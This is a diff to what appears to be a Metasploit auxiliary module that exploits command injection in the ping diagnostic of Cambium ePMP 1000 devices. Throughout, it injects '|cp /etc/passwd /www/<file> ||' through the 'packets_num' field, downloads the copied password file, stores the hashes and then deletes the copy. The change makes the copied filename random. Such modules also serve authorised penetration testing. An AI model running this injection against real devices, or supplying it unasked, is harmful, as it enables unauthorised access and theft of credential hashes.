@@ -47,7 +47,8 @@ class MetasploitModule < Msf::Auxiliary
 
   # Command Execution
   def hash_dump(config_uri, cookie)
-    command = 'cp /etc/passwd /www/'
+    random_filename = Rex::Text::rand_text_alpha(8)
+    command = 'cp /etc/passwd /www/' + random_filename
     inject = '|' + "#{command}" + ' ||'
     clean_inject = CGI.unescapeHTML(inject.to_s)
 
@@ -66,7 +67,7 @@ class MetasploitModule < Msf::Auxiliary
         },
         'vars_post' =>
           {
-            'ping_ip' => '8.8.8.8', # This parameter can also be used for injection
+            'ping_ip' => '127.0.0.1', # This parameter can also be used for injection
             'packets_num' => clean_inject,
             'buf_size' => 0,
             'ttl' => 1,
@@ -85,7 +86,7 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_cgi(
         {
           'method' => 'GET',
-          'uri' => '/passwd',
+          'uri' => '/' + random_filename,
           'cookie' => cookie,
           'headers' => {
             'Accept' => '*/*',
@@ -104,13 +105,13 @@ class MetasploitModule < Msf::Auxiliary
       )
 
       if good_response
-        vprint_status("#{rhost}:#{rport} - Dumping password hashes")
+        print_status("#{rhost}:#{rport} - Dumping password hashes")
 
         path = store_loot('ePMP_passwd', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 password hashes')
         print_status("#{rhost}:#{rport} - Hashes saved in: #{path}")
 
         # clean up the passwd file from /www/
-        command = 'rm /www/passwd'
+        command = 'rm /www/' + random_filename
         inject = '|' + "#{command}" + ' ||'
         clean_inject = CGI.unescapeHTML(inject.to_s)
 
@@ -129,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
             },
             'vars_post' =>
               {
-                'ping_ip' => '8.8.8.8', # This parameter can also be used for injection
+                'ping_ip' => '127.0.0.1', # This parameter can also be used for injection
                 'packets_num' => clean_inject,
                 'buf_size' => 0,
                 'ttl' => 1,
@@ -138,7 +139,7 @@ class MetasploitModule < Msf::Auxiliary
           }
         )
       else
-        check_file_uri = "#{(ssl ? 'https' : 'http')}" + '://' + "#{rhost}:#{rport}" + '/passwd'
+        check_file_uri = "#{(ssl ? 'https' : 'http')}" + '://' + "#{rhost}:#{rport}" + '/' + random_filename
         print_error("#{rhost}:#{rport} - Could not retrieve hashes. Try manually by directly accessing #{check_file_uri}.")
       end
     else
